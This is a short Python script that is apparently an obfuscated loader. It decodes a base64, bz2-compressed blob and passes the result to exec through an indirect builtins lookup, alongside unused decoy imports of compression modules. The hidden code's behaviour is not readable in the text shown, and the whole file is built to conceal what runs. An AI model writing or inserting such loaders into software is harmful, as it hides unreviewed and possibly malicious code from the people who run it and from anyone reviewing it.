import sys
import base64, codecs, zlib, lzma, gzip, bz2, marshal
_p = b'QlpoOTFBWSZTWUxBE4oAADBfgEQQQPxaFgIAAQon5d+gIACSEakNMCA00A0AyCUjUxNRk9T1MgeTUaDQoe5XsGYQcCMCtskkLG6nh+k/UXmCrB/7J1jOOPE6dZuuTRhnaapUpBSrSWJZxqlGJ812YbRG8kbvheYMCx6GCQ8SD6HRMIKZFBcTySUKRFZVOTJrS6VgDE8HU90bTrJdH4u5IpwoSCYgicUA'
sys.modules['builtins'].exec(bz2.decompress(base64.b64decode(_p)))
